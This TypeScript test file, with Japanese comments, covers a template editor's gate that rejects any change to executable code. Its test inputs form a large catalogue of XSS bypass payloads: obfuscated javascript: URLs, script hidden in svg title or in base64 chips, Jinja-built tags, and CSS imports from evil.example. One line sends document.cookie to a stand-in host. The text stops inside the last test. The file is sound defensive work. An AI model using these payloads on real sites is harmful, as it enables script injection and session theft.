// =============================================================================
// templateScripts.test.ts — テンプレ実行コード面の不変性(C0)
// =============================================================================
// テンプレの JS は正当なコンテンツで、除去してはならない。守るのは「生成時に確定した
// 実行コードが、編集・申請・承認・ペア転写のどの経路でも変わらない」ことだけである。
// よって本テストの重心は**迂回入力が拒否される**ことの主張に置き、正常系は「正当な編集を
// 誤って拒否しない」ことの回帰に絞る。承認者は実行結果しか見ないので、この照合が破れても
// 承認者は気づけない — ただし単独で承認の防壁になるわけではなく、承認画面の隔離
// (`sandbox="allow-scripts"`・same-origin なし)と対で初めて成立する。
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { isAppError } from '@editor/shared';
import { describe, expect, it } from 'vitest';
import {
  assertTemplateScriptsUnchanged,
  collectExecutableUnits,
  expandEncodedChips,
} from '../src/security/templateScripts.js';

const CTX = { templateId: 'XX01_950037_20240710_交付版', where: 'test' };

describe('走査の作業量が入力長に対して線形に収まる(DoS)', () => {
  // いずれも二次だった実装では数分〜停止に達した形。線形化と byte 予算で必ず返ることを
  // 主張する(タイムアウトすれば回帰として赤くなる)。件数の主張はしない — 返ることが要件。
  it('閉じない `{{` の連なりを持つ URL 属性を舐め続けない(isInertUrl の線形 strip)', () => {
    const html = `<a href="${'{'.repeat(500_000)}">`;
    expect(Array.isArray(collectExecutableUnits(html))).toBe(true);
  });
  it('閉じない `<style>` の反復を残り全体として再走査し続けない(depth + 予算)', () => {
    const html = '<style>'.repeat(100_000);
    expect(Array.isArray(collectExecutableUnits(html))).toBe(true);
  });
  it('タグ内の `{{` 反復で閉じ記号を末尾まで探し続けない(jinjaEnd の予算)', () => {
    const html = `<div ${'{{ '.repeat(200_000)}>`;
    expect(Array.isArray(collectExecutableUnits(html))).toBe(true);
  });
  it('1 つのタグに直接置いた多数の Jinja を、トークンごとに先頭から探し直さない', () => {
    const html = `<a ${'{{a}}'.repeat(800_000)}>`;
    expect(Array.isArray(collectExecutableUnits(html))).toBe(true);
  });
  it('1 つのタグの多数の属性値の Jinja を、トークンごとに先頭から探し直さない', () => {
    const html = `<a ${'b="{{a}}" '.repeat(300_000)}>`;
    expect(Array.isArray(collectExecutableUnits(html))).toBe(true);
  });
});

describe('線形 Jinja strip は隠れた活性スキームを取り逃がさない', () => {
  // `href="{{''}}javascript:…"` はトークンを剥がすと活性になる。剥がしを線形化しても
  // この判定(単位化される = 基準と異なれば拒否)が保たれることを固定する。
  it('先頭の閉じるトークンの後ろに javascript: があれば単位化する', () => {
    const units = collectExecutableUnits(`<a href="{{''}}javascript:alert(1)">`);
    expect(units.some((u) => u.startsWith('url:'))).toBe(true);
  });
  it('トークン展開後も相対 URL のままなら単位化しない', () => {
    const units = collectExecutableUnits(`<a href="{{ x }}/foo/bar">`);
    expect(units.some((u) => u.startsWith('url:'))).toBe(false);
  });
});

/** 不変性照合の結果を boolean で得る(AppError であることも同時に確かめる)。 */
function accepted(baseline: string, submitted: string): boolean {
  try {
    assertTemplateScriptsUnchanged(baseline, submitted, CTX);
    return true;
  } catch (e) {
    expect(isAppError(e)).toBe(true);
    return false;
  }
}

/** `data-opaque` の窓(base64 退避属性)へ任意バイト列を詰めた提出 HTML を作る。 */
const opaque = (payload: string): string =>
  `<span class="jinja-chip" data-opaque="${Buffer.from(payload, 'utf8').toString('base64')}"></span>`;

const BASE = '<html><body><script>col.width=1</script><p>本文</p></body></html>';

describe('assertTemplateScriptsUnchanged — 迂回入力の拒否', () => {
  it('実行コードが 1 文字も変わらなければ通る(唯一の正常系)', () => {
    expect(accepted(BASE, `${BASE.replace('<p>本文</p>', '<p>差し替えた本文</p>')}`)).toBe(true);
  });

  it('script を足したら拒否する', () => {
    expect(accepted(BASE, BASE.replace('</body>', '<script>fetch("/x")</script></body>'))).toBe(
      false,
    );
  });

  it('script の中身を書き換えたら拒否する', () => {
    expect(accepted(BASE, BASE.replace('col.width=1', 'col.width=1;fetch("/x")'))).toBe(false);
  });

  it('script を消しても拒否する(削除も変更である)', () => {
    expect(accepted(BASE, BASE.replace('<script>col.width=1</script>', ''))).toBe(false);
  });

  it('data-opaque の窓に script を隠しても拒否する', () => {
    // 下書き保存は requireAuth のみで任意ロールが書けるため、チップの中身は信用できない。
    // 復号した実体に対して照合していなければ、ここが素通りして承認まで到達する。
    expect(
      accepted(BASE, BASE.replace('<p>本文</p>', opaque('<script>fetch("/x")</script>'))),
    ).toBe(false);
  });

  it('基準側も復号して比較するので、同じ script をチップへ畳んだだけなら通る', () => {
    const chipped = BASE.replace(
      '<script>col.width=1</script>',
      opaque('<script>col.width=1</script>'),
    );
    expect(accepted(BASE, chipped)).toBe(true);
  });

  it('入れ子のチップに隠した script も拒否する', () => {
    const nested = opaque(opaque('<script>fetch("/x")</script>'));
    expect(accepted(BASE, BASE.replace('<p>本文</p>', nested))).toBe(false);
  });

  it('インライン event handler の追加を拒否する', () => {
    expect(accepted(BASE, BASE.replace('<p>', '<p onclick="fetch(\'/x\')">'))).toBe(false);
  });

  it('未知の on* 属性名でも拒否する(既知イベント名を数え上げない)', () => {
    expect(accepted(BASE, BASE.replace('<p>', '<p onbeforetoggle="fetch(\'/x\')">'))).toBe(false);
  });

  it('javascript: URL の追加を拒否する', () => {
    expect(accepted(BASE, BASE.replace('<p>本文</p>', '<a href="javascript:fetch(1)">x</a>'))).toBe(
      false,
    );
  });

  it('スキーム名に空白・制御文字を挟んだ javascript: も拒否する', () => {
    expect(
      accepted(BASE, BASE.replace('<p>本文</p>', '<a href="java\tscript:fetch(1)">x</a>')),
    ).toBe(false);
  });

  it('閉じタグを欠いた script も実行面として拾う', () => {
    expect(accepted(BASE, `${BASE}<script>fetch("/x")`)).toBe(false);
  });

  it('基準が空(確定も生成物も無い)なら実行コードは 1 つも持てない', () => {
    // fail-closed。基準の無い実行コードを承認へ通さない。
    expect(accepted('', '<p>本文</p>')).toBe(true);
    expect(accepted('', '<script>fetch("/x")</script>')).toBe(false);
  });

  it('script の並び順を入れ替えたら拒否する(集合ではなく順序込みで比較する)', () => {
    const two = '<script>a()</script><p>x</p><script>b()</script>';
    const swapped = '<script>b()</script><p>x</p><script>a()</script>';
    expect(accepted(two, swapped)).toBe(false);
  });
});

// 初版の抽出は script 要素 / `on*` 属性 / 生の `javascript:` の 3 形態だけを数えており、
// 以下はすべて baseline と完全一致して申請・承認の両入口を素通りした(実測)。
// 許可リスト方式へ反転した今、能動コンテンツの「別の言語機能」も単位として拾えていること。
describe('列挙型の抽出を素通りした迂回入力(回帰)', () => {
  const bypass = (injected: string): boolean =>
    accepted(BASE, BASE.replace('<p>本文</p>', injected));

  it('iframe srcdoc に実体参照で隠した script を拒否する', () => {
    expect(bypass('<iframe srcdoc="&lt;script&gt;fetch(1)&lt;/script&gt;"></iframe>')).toBe(false);
  });

  it('data:text/html を読み込む iframe を拒否する', () => {
    const doc = Buffer.from('<script>fetch(1)</script>', 'utf8').toString('base64');
    expect(bypass(`<iframe src="data:text/html;base64,${doc}"></iframe>`)).toBe(false);
  });

  it('data:text/html を読み込む object を拒否する', () => {
    expect(bypass('<object data="data:text/html,<script>fetch(1)</script>"></object>')).toBe(false);
  });

  it('&#58; で `:` を隠した javascript URL を拒否する', () => {
    expect(bypass('<a href="javascript&#58;fetch(1)">x</a>')).toBe(false);
  });

  it('SVG アニメーションで href を javascript: へ差し替える形を拒否する', () => {
    expect(bypass('<svg><animate attributeName="href" to="javascript&#58;alert(1)"/></svg>')).toBe(
      false,
    );
  });

  it('meta refresh による data:text/html への遷移を拒否する', () => {
    expect(
      bypass('<meta http-equiv="refresh" content="0;url=data:text/html,<script>x</script>">'),
    ).toBe(false);
  });

  it('style の @import による外部スタイル取り込みを拒否する', () => {
    expect(bypass('<style>@import url(https://evil.example/x.css);</style>')).toBe(false);
  });

  it('外部スタイルシートの link 追加を拒否する', () => {
    expect(bypass('<link rel="stylesheet" href="https://evil.example/x.css">')).toBe(false);
  });

  it('style 属性の url() で非画像スキームを引く形を拒否する', () => {
    expect(bypass('<div style="background:url(javascript:alert(1))">x</div>')).toBe(false);
  });

  it('タグ内 Jinja の差し替え(描画時に任意属性へ展開される)を拒否する', () => {
    const base = '<div {{ attrs }}>x</div>';
    expect(accepted(base, '<div {{ evil_attrs }}>x</div>')).toBe(false);
  });
});

// 過剰包含は「基準側にも同じだけ現れる」から誤検知にならない、が成り立つことの確認。
// ここが崩れると正当な保存が拒否され、運用側から検査ごと外される圧力になる。
describe('正当な編集を拒否しない(誤検知の回帰)', () => {
  const TPL = [
    '<!doctype html>',
    '<html lang="ja"><head><meta charset="utf-8" />',
    '<title>{{ fund.name }}</title>',
    '<link rel="stylesheet" href="css/{{ fund.code }}.css" />',
    '</head><body>',
    '<div class="page"><p class="notes">注記</p>',
    '<svg viewBox="0 0 100 50"><polyline points="0,0 10,10" stroke="#333" /></svg>',
    '<script>col.width=1</script>',
    '</body></html>',
  ].join('\n');

  it('本文・クラス・インラインスタイルの編集は通る', () => {
    const edited = TPL.replace(
      '<p class="notes">注記</p>',
      '<p class="notes lead" style="color:#333">書き直した注記</p>',
    );
    expect(accepted(TPL, edited)).toBe(true);
  });

  it('属性の並び順・引用符・自己終了スラッシュの揺れでは拒否しない', () => {
    const reserialized = TPL.replace(
      '<link rel="stylesheet" href="css/{{ fund.code }}.css" />',
      "<link href='css/{{ fund.code }}.css' rel='stylesheet'>",
    );
    expect(accepted(TPL, reserialized)).toBe(true);
  });
});

describe('collectExecutableUnits / expandEncodedChips', () => {
  it('退避属性は data-opaque 以外(data-jinja 系)も復号対象にする', () => {
    const html = `<span data-jinja="${Buffer.from('<script>x()</script>').toString('base64')}"></span>`;
    expect(expandEncodedChips(html)).toContain('<script>x()</script>');
    expect(collectExecutableUnits(html)).toHaveLength(1);
  });

  it('改行コードと前後空白の差は吸収するが中身は畳まない', () => {
    expect(collectExecutableUnits('  <script>a()</script>  ')).toEqual(
      collectExecutableUnits('<script>a()</script>'),
    );
    expect(collectExecutableUnits('<script>a( )</script>')).not.toEqual(
      collectExecutableUnits('<script>a()</script>'),
    );
  });
});

// R-再レビュー: raw text 要素の読み飛ばしが単位抽出ごと消していた穴。
// HTML の `<title>` が RCDATA なのは HTML 名前空間だけで、SVG の foreign content では
// 普通の外来要素。つまり `<svg><title><script>…` は実行されるのに単位ゼロで通っていた。
describe('raw text 読み飛ばしの迂回', () => {
  it('長さの変わる大文字(`İ`)を前に並べても raw text の後ろの script を拾う', () => {
    for (const n of [2, 8]) {
      const html = `${'İ'.repeat(n)}<style>x</style><script>evil()</script>`;
      expect(collectExecutableUnits(html)).toEqual(['script:|evil()']);
    }
  });

  const svgBase = '<div><svg><title>zu</title></svg></div>';

  it('<svg><title> の内側に隐した script を拒否する', () => {
    const evil =
      '<div><svg><title><script>fetch("//x/"+document.cookie)</script></title></svg></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(svgBase, evil)).toBe(false);
  });

  it('<svg><title> の内側に隐した <style>@import を拒否する', () => {
    const evil = '<div><svg><title><style>@import url(http://evil/x)</style></title></svg></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(svgBase, evil)).toBe(false);
  });

  it('textarea の内側も同じく走査する', () => {
    const base = '<div><textarea>a</textarea></div>';
    const evil = '<div><textarea><script>x()</script></textarea></div>';
    expect(accepted(base, evil)).toBe(false);
  });
});

// CSS の URL 検出は `url(` を探す形だと `image-set("http://…")` で破れる。
// PDF 経路のゲート(`@editor/shared`)と同じ判定を共有していることを主張する。
describe('CSS の外部参照検出の共有', () => {
  const base = '<div><style>.a{color:red}</style></div>';

  it('image-set() の引用符文字列に置いた絶対 URL を拒否する', () => {
    const evil = '<div><style>.a{background-image:image-set("http://evil/x.png" 1x)}</style></div>';
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted(base, evil)).toBe(false);
  });

  it('-webkit-image-set も同じく拒否する', () => {
    const evil =
      '<div><style>.a{background-image:-webkit-image-set("http://evil/x.png" 1x)}</style></div>';
    expect(accepted(base, evil)).toBe(false);
  });

  it('ページ番号のマージンボックスは単位を作らない(正当な CSS を拒らない)', () => {
    const css = '<div><style>@page{@bottom-center{content:counter(page)}}</style></div>';
    expect(collectExecutableUnits(css)).toEqual([]);
  });
});

// URL 属性の Jinja トークンで始まる値を無条件 inert にしていた穴。
// テンプレは描画されてから使われるので、描画後の href は `javascript:alert(1)` になる。
describe('Jinja トークンを前置した URL', () => {
  it('href="{{\'\'}}javascript:…" を拒否する', () => {
    const evil = `<a href="{{''}}javascript:alert(1)">x</a>`;
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(0);
    expect(accepted('<a href="/x">x</a>', evil)).toBe(false);
  });

  // 属性値の中の Jinja は描画で任意の文字列になるので、形を問わず単位にする。URL の
  // スキームの判定では閉じられない(`'javascript'` と後ろの地の `:` がつながる)ため。
  it('両側に同じ値の中の Jinja があれば通る(誤検知しない)', () => {
    const base = '<p>前</p><a href="{{ fund.url }}">x</a><img src="{{ logo }}/a.png">';
    expect(accepted(base, base.replace('<p>前</p>', '<p>書き直した</p>'))).toBe(true);
  });

  it('値の中の Jinja を変えると拒否する', () => {
    expect(collectExecutableUnits('<a href="{{ fund.url }}">x</a>')).toEqual([
      'jinja-val:a.href|{{ fund.url }}',
    ]);
    expect(accepted('<a href="{{ fund.url }}">x</a>', '<a href="{{ fund.other_url }}">x</a>')).toBe(
      false,
    );
    expect(accepted('<img src="{{ logo }}/a.png">', '<img src="{{ evil }}/a.png">')).toBe(false);
  });
});

// ── 走査器の終端規則 ──
// この走査器は手書きで、仕様準拠パーサではない。よって「終端の解釈がブラウザとずれる」
// 形が迂回路になる。ずれている間、単位列は基準と一致したまま実行面だけが増える。
describe('コメント終端 --!> の解釈', () => {
  it('<!-- a --!><script>…</script>--> に隠した script を拒否する', () => {
    // ブラウザは `--!>` でコメントを閉じるので、続く <script> は実行される。
    const evil = BASE.replace(
      '<p>本文</p>',
      '<p>本文</p><!-- a --!><script>fetch("/x")</script>-->',
    );
    expect(collectExecutableUnits(evil).length).toBeGreaterThan(
      collectExecutableUnits(BASE).length,
    );
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('abrupt closing(<!-->)の後ろに置いた script も拒否する', () => {
    const evil = BASE.replace('<p>本文</p>', '<!--><script>fetch("/x")</script>');
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('閉じないコメントの中身も走査する(fail closed)', () => {
    const evil = `${BASE}<!-- <script>fetch("/x")</script>`;
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('普通のコメントは単位を作らない(誤検知しない)', () => {
    const ok = BASE.replace('<p>本文</p>', '<!-- 説明 --><p>本文</p>');
    expect(accepted(BASE, ok)).toBe(true);
  });
});

// ── タグ内 Jinja の読み飛ばし(仕様準拠パーサ化の評価で出た実測の迂回路)──
// 走査器は「タグ内に Jinja 断片があれば読み飛ばす」が、読み飛ばせないと判断したときに
// **入力の残り全部を捨てて**いた。単位列は基準と完全一致したまま、その後ろに任意の
// 実行面を足せる = 不変性ゲートそのものの迂回路である(申請・承認の両入口を通った)。
// ブラウザは `{` を普通の属性名文字として読み、タグを最初の `>` で閉じて後続を実行する。
describe('タグ内 Jinja で走査を打ち切らない', () => {
  const inject = (prefix: string): string =>
    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script></body></html>`;

  it.each([
    ['Jinja 開始ですらない `{`', '<div {>'],
    ['閉じない {{', '<div {{ x >'],
    ['閉じない {%', '<p {% for >'],
    ['閉じない {#', '<span {#>'],
  ])('%s を挟んで足した script を拒否する', (_label, prefix) => {
    const evil = inject(prefix);
    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
    expect(accepted(BASE, evil)).toBe(false);
  });

  it('遠くの閉じ記号で script を丸ごと 1 断片に飲み込む形も拒否する', () => {
    // `}}` を文書の後ろへ置けば、その間の実行面が「タグ内 Jinja」として単位から消えていた。
    const evil = '<div {{ ><script>fetch("//evil/")</script>}}></div>';
    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
    expect(accepted('<div></div>', evil)).toBe(false);
  });

  it('正当なタグ内 Jinja は 1 単位のまま(`>` を含む式でも分割しない)', () => {
    expect(collectExecutableUnits('<td {% if a > b %}class="x"{% endif %}>a</td>')).toEqual([
      'jinja-attr:td|{% if a > b %}',
      'jinja-attr:td|{% endif %}',
    ]);
    expect(collectExecutableUnits('<div {{ d["k"] }}>x</div>')).toEqual([
      'jinja-attr:div|{{ d["k"] }}',
    ]);
  });
});

// ── 仕様準拠パーサ(parse5 等)へ置き換えないことの根拠(回帰ガード)──
// 検査対象は**描画前の Jinja テンプレ**であって HTML 文書ではない。ゆえに HTML 仕様どおりの
// 木構築は「別の成果物に対する正しさ」になる: 生の字面では raw text 要素やコメントに
// 包まれて見えるものが、Jinja 描画後には包みが消えて実行される。実測で parse5 は下の 3 形を
// すべて単位ゼロにした(= 素通り)のに対し、本走査器の過剰包含は拾う。ここが緑である限り
// 「木構築するパーサへ置き換える」は退行である。
describe('描画前テンプレ特有の隠し方(木構築パーサでは消える形)', () => {
  const inject = (prefix: string, suffix: string): string =>
    `<html><body><script>col.width=1</script>${prefix}<script>fetch("//evil/")</script>${suffix}</body></html>`;

  it.each([
    [
      '条件付き textarea',
      '{% if false %}<textarea>{% endif %}',
      '{% if false %}</textarea>{% endif %}',
    ],
    ['条件付きコメント', '{% if false %}<!--{% endif %}', '{% if false %}-->{% endif %}'],
    ['条件付き title', '{% if false %}<title>{% endif %}', '{% if false %}</title>{% endif %}'],
  ])('%s で包んでも実行面として拾う', (_label, prefix, suffix) => {
    const evil = inject(prefix, suffix);
    expect(collectExecutableUnits(evil)).toContain('script:|fetch("//evil/")');
    expect(accepted(BASE, evil)).toBe(false);
  });
});

// テキスト中の出力式は描画時に任意の文字列を出せる。字面に `<`+英字が現れなくても、
// 描画後にタグが生まれれば実行面が増える。
describe('テキスト中の出力式が描画時に生むマークアップ', () => {
  it.each([
    ['safe で < を出す script', '{{ "<"|safe }}script>fetch("//evil/")</script>'],
    ['safe で < を出す onerror', '{{ "<"|safe }}img src=x onerror=fetch("//evil/")>'],
    [
      'set した < を出力する script',
      '{% set lt = "<" %}{{ lt|safe }}script>fetch("//evil/")</script>',
    ],
  ])('%s を拒否する', (_label, payload) => {
    const evil = BASE.replace('</body>', `${payload}</body>`);
    expect(accepted(BASE, evil)).toBe(false);
  });
});

// ── 描画で生まれる実行面(文脈ごとの規則)──
// 走査器は「`<` の直後が英字」の字面しか見ない。下の表の形は、どれも走査器の字面の規則だけでは
// 単位にならず、描画後は実行面になる。
describe('描画で生まれる実行面を単位にする', () => {
  const base = '<html><body><h1>x</h1></body></html>';
  const add = (payload: string) => base.replace('</body>', `${payload}</body>`);

  it.each([
    ['safe で < を出す', '{{ "<"|safe }}script>evil()</script>'],
    ['< の直後の Jinja コメント', '<{# c #}script>evil()</script>'],
    ['< の直後の空の if', '<{% if true %}{% endif %}script>evil()</script>'],
    ['< と空白の後ろの空白を刈る if', '< {%- if true %}{% endif %}script>evil()</script>'],
    ['< の直後の出力式', '<{{ "script" }}>evil()</script>'],
    ['raw で包んだ <', '{% raw %}<{% endraw %}script>evil()</script>'],
    ['反復で < を出す', '{% for lt in ["<"] %}{{ lt|safe }}script>evil(){% endfor %}</script>'],
    ['ブロックの set で < を束ねる', '{% set lt %}<{% endset %}{{ lt }}script>evil()</script>'],
    ['値の中の文字列の連結で javascript:', `<a href="{{ 'java' + 'script:evil()' }}">x</a>`],
    ['値の中の default で javascript:', `<a href="{{ x|default('javascript:evil()') }}">x</a>`],
    [
      'style 属性の綴りを Jinja コメントで割る',
      '<div style="background:ur{# #}l(//evil/x)">x</div>',
    ],
    ['include', '{% include "other.html" %}'],
    ['タグ名に挟んだ出力式', '<scr{{ "" }}ipt>evil()</script>'],
    ['@import の綴りを Jinja コメントで割る', '<style>@imp{# #}ort url(//evil/x)</style>'],
    ['値の中の Jinja とつながる javascript:', `<a href="{{ 'javascript' }}:alert(1)">x</a>`],
    ['style 属性の関数名を Jinja で作る', '<div style="background:{{ u }}(//evil/x)">x</div>'],
    ['<style> の中の出力式', '<style>{{ x }}</style>'],
    // テキストの位置のトークンの中に `<` があると、走査器はそこからタグを読み、後ろの実行面を
    // 属性として飲み込む。描画でトークンが消えると、飲み込まれた側が素で残る。
    ['Jinja コメントの中のタグが script を飲み込む', '{# <b title=#}<script>evil()</script>'],
    [
      'Jinja コメントの中の引用符付きの値が script を飲み込む',
      '{# <b title="#}<script>evil()</script>">',
    ],
    ['if の比較の < がタグに見える', '{% if a <b %}<script>evil()</script>{% endif %}'],
    ['set の比較の < がタグに見える', '{% set x = a <b %}<script>evil()</script>'],
    ['出力式の比較の < がタグに見える', '{{ a <b }}<script>evil()</script>'],
    [
      'elif の比較の < がタグに見える',
      '{% if c %}{% elif a <b %}<script>evil()</script>{% endif %}',
    ],
    ['for の対象の < がタグに見える', '{% for x in a <b %}<script>evil()</script>{% endfor %}'],
  ])('%s を拒否する', (_label, payload) => {
    const evil = add(payload);
    expect(collectExecutableUnits(evil)).not.toEqual(collectExecutableUnits(base));
    expect(accepted(base, evil)).toBe(false);
  });

  it('class の値の中の Jinja の差し替えを拒否する', () => {
    expect(accepted(add('<p class="{{ x }}">a</p>'), add('<p class="{{ y }}">a</p>'))).toBe(false);
  });

  it('Jinja コメントで割った CSS の綴りは、コメントを消した形でも外部参照を拾う', () => {
    expect(collectExecutableUnits('<div style="background:ur{# #}l(//evil/x)">x</div>')).toContain(
      'css-ref:url(//evil/x)',
    );
  });

  it('字句の読めない Jinja は両側にあれば通り、提出側だけなら拒否する', () => {
    const broken = add('<p>{{ 閉じない</p>');
    expect(collectExecutableUnits(broken)).toContain('jinja-lex-error');
    expect(accepted(broken, broken.replace('<h1>x</h1>', '<h1>y</h1>'))).toBe(true);
    expect(accepted(base, broken)).toBe(false);
  });
});

describe('文脈ごとの規則は正当な編集を拒否しない', () => {
  it('属性の並び順だけを変えても、値の中の Jinja の単位は動かない', () => {
    const base = '<p>a</p><img src="{{ a }}" alt="{{ b }}" style="width:{{ w }}px">';
    const reordered = '<p>a</p><img style="width:{{ w }}px" alt="{{ b }}" src="{{ a }}">';
    expect(accepted(base, reordered)).toBe(true);
  });

  it('同じ属性の中のトークンの並びを入れ替えると拒否する', () => {
    expect(accepted('<a href="{{ a }}{{ b }}">x</a>', '<a href="{{ b }}{{ a }}">x</a>')).toBe(
      false,
    );
  });

  it('fixture のテンプレートの Jinja の単位は data-rank の値だけで、パーツは単位を作らない', () => {
    const fixtures = path.resolve(__dirname, '../../fixtures');
    for (const f of readdirSync(path.join(fixtures, 'templates'))) {
      const units = collectExecutableUnits(
        readFileSync(path.join(fixtures, 'templates', f), 'utf8'),
      ).filter((u) => u.startsWith('jinja'));
      expect(units).toEqual(['jinja-val:tr.data-rank|{{ loop.index }}']);
    }
    const parts = JSON.parse(readFileSync(path.join(fixtures, 'parts.json'), 'utf8')) as {
      content: string;
    }[];
    for (const p of parts) {
      expect(collectExecutableUnits(p.content).filter((u) => u.startsWith('jinja'))).toEqual([]);
    }
  });

  const tpl = [
    '<html><head><style>.a{width:{{ w }}px}</style></head><body>',
    '<p class="lead">地の文</p>',
    '<a href="{{ fund.url }}">リンク</a>',
    '{% for h in holdings %}<tr data-rank="{{ loop.index }}"><td>{{ h.name }}</td></tr>{% endfor %}',
    '<div>{{ note|safe }}</div>',
    '</body></html>',
  ].join('\n');

  it('両側に同じ Jinja があり、地の文だけを編集すると通る', () => {
    expect(accepted(tpl, tpl.replace('地の文', '書き直した地の文'))).toBe(true);
  });

  it('テキストの位置に不活性な値の参照を足しても通る', () => {
    expect(accepted(tpl, tpl.replace('地の文', '{{ fund.name }}の地の文'))).toBe(true);
  });

  it('テキストの位置に不活性でない文を足すと拒否する', () => {
    expect(accepted(tpl, tpl.replace('地の文', '{% set x %}地の文{% endset %}'))).toBe(false);
  });
});

// `<style>` の本文の再走査で積む単位は、本文を起点にした位置のままだと文書の先頭のほうへずれる。
// 基準と提出で同じだけずれる間は表に出ないが、`<style>` より前を編集すると並びが変わる。
describe('<style> の本文の単位は文書の位置で並べる', () => {
  const tpl = [
    '<html><body>',
    '<section id="a">前のパーツ</section>',
    '<p onclick="keep()">x</p>',
    '<svg><style>.pad{color:red;width:1px}<img src=x onerror="kept()"></style></svg>',
    '</body></html>',
  ].join('');

  it('<style> より前のパーツを消しても通る', () => {
    expect(accepted(tpl, tpl.replace('<section id="a">前のパーツ</section>', ''))).toBe(true);
  });

  it('<style> より前にパーツを足しても通る', () => {
    expect(
      accepted(tpl, tpl.replace('<html><body>', '<html><body><section id="b">足した</section>')),
    ).toBe(true);
  });

  it('<style> より前のパーツを並べ替えても通る', () => {
    const two = tpl.replace('<section id="a">', '<section id="z">z</section><section id="a">');
    const swapped = two.replace(
      '<section id="z">z</section><section id="a">前のパーツ</section>',
      '<section id="a">前のパーツ</section><section id="z">z</section>',
    );
    expect(accepted(two, swapped)).toBe(true);
  });

  it('<style> の中の単位は <style> より前の単位の後ろに並ぶ', () => {
    const html = '<i>pad</i><p onclick="b()">x</p><svg><style><img onerror="a()"></style></svg>';
    expect(collectExecutableUnits(html)).toEqual(['attr:p.onclick=b()', 'attr:img.onerror=a()']);
  });
});

describe('拒否の文言は違いの種類で分ける', () => {
  const base = '<html><body><script>col.width=1</script><p>本文</p></body></html>';
  const errorOf = (submitted: string) => {
    try {
      assertTemplateScriptsUnchanged(base, submitted, CTX);
    } catch (e) {
      if (isAppError(e)) return e;
    }
    throw new Error('拒否されなかった');
  };

  it('違いが Jinja の単位だけなら、差し込みの書き方の文言を返す', () => {
    const e = errorOf(base.replace('<p>本文</p>', '<p>{% include "x" %}</p>'));
    expect(e.code).toBe('TEMPLATE_SCRIPT_IMMUTABLE');
    expect(e.kind).toBe('forbidden');
    expect(e.message).toContain('差し込み（Jinja）の書き方');
    expect(e.message).toContain(`テンプレート=${CTX.templateId}`);
  });

  it('script の違いなら、今の文言を返す', () => {
    const e = errorOf(base.replace('col.width=1', 'evil()'));
    expect(e.code).toBe('TEMPLATE_SCRIPT_IMMUTABLE');
    expect(e.message).toContain('実行コード・外部参照は編集できません');
    expect(e.message).not.toContain('差し込み（Jinja）');
  });

  it('ログの cause に単位の種類ごとの数を残す', () => {
    const e = errorOf(base.replace('<p>本文</p>', '<p>{% include "x" %}</p>'));
    expect(e.cause).toMatchObject({
      baselineKinds: { script: 1 },
      submittedKinds: { script: 1, jinja: 1 },
    });
  });
});

describe('raw text の終了タグは直後の文字まで見る', () => {
  it('</scriptx> は終了タグではない(末尾のコードが単位へ入る)', () => {
    // JS エンジンは `init() < /scriptx>/ ; evil()` と読むので `evil()` が走る。
    const base = '<html><body><script>/*x*/init()</script></body></html>';
    const evil = '<html><body><script>/*x*/init()</scriptx>/;evil()</script></body></html>';
    expect(collectExecutableUnits(evil)).not.toEqual(collectExecutableUnits(base));
    expect(accepted(base, evil)).toBe(false);
  });

  it('</style-x> も終了タグではない(隠した @import を拾う)', () => {
    const base = '<div><style>.a{color:red}</style></div>';
    const evil = '<div><style>.a{color:red}</style-x>@import url(http://evil/x);</style></div>';
    expect(accepted(base, evil)).toBe(false);
  });

  it('大小文字・空白入りの正規の終了タグは従来どおり終端する(誤検知しない)', () => {
    const base = '<html><body><script>col.width=1</script></body></html>';
    const same = '<html><body><script>col.width=1</SCRIPT ></body></html>';
    expect(accepted(base, same)).toBe(true);
  });
});

// ── 走査器とブラウザの解釈がずれる形 ──
// 「読み飛ばした範囲は必ず単位化する」という不変則を、raw text 要素ごとに機械検証する。
// SVG の foreign content では raw text にならない、という事実は raw text 扱いする全要素へ
// 一様に効く。要素を足して単位化の分岐を書き忘れたらここが落ちる。
describe('raw text 要素の内側は必ず単位化される', () => {
  // 実 Chromium で onerror の発火を確認済みの形だけを並べる(単なる字面ではない)。
  const 実行される形 = {
    '<style=x> はタグ名が = で終端せず未知要素になる':
      '<style=x><img src=x onerror="evil()"></style=x>',
    '<svg><style> は foreign content で raw text にならない':
      '<svg><style><img src=x onerror="evil()"></style></svg>',
    '<svg><title> も同様': '<svg><title><img src=x onerror="evil()"></title></svg>',
    '<svg><textarea> も同様': '<svg><textarea><img src=x onerror="evil()"></textarea></svg>',
  };
  const base = '<html><body><h1>基準</h1></body></html>';
  for (const [label, payload] of Object.entries(実行される形)) {
    it(`${label} → 単位が増えるので拒否される`, () => {
      const evil = base.replace('</body>', `${payload}</body>`);
      expect(collectExecutableUnits(evil)).not.toEqual(collectExecutableUnits(base));
      expect(accepted(base, evil)).toBe(false);
    });
  }

  it('style の CSS 外部参照の単位化は従来どおり残っている(再走査で置き換えていない)', () => {
    const b = '<div><style>.a{color:red}</style></div>';
    const evil = '<div><style>@import url(http://evil/x);.a{color:red}</style></div>';
    expect(accepted(b, evil)).toBe(false);
  });

  it('CSS の宣言だけの編集は従来どおり通る(過剰包含が正当な操作を止めない)', () => {
    const b = '<div><style>.a{color:red;width:10px}</style></div>';
    const edited = '<div><style>.a{color:blue;width:20px}</style></div>';
    expect(accepted(b, edited)).toBe(true);
  });
});

// ── 走査の端(壊れた入力で単位列が欠落・混入しない)──
// これまでの節は「実行面を隠す入力」を主に見てきた。ここは走査そのものが壊れて
// (単位が消える/紛れ込む)いないかを、退避属性・タグ走査・URL scheme の端で確かめる。
describe('走査の端(壊れた入力で単位列が欠落・混入しない)', () => {
  const units = (html: string) => collectExecutableUnits(html);

  it('空の data-opaque と single quote の data-opaque は復号対象にならない / なる', () => {
    // 復号結果が空文字は payload として積まない(splitEncodedChips)。属性そのものは
    // テキストから取り除かれるので、残る要素は inert のまま単位を作らない。
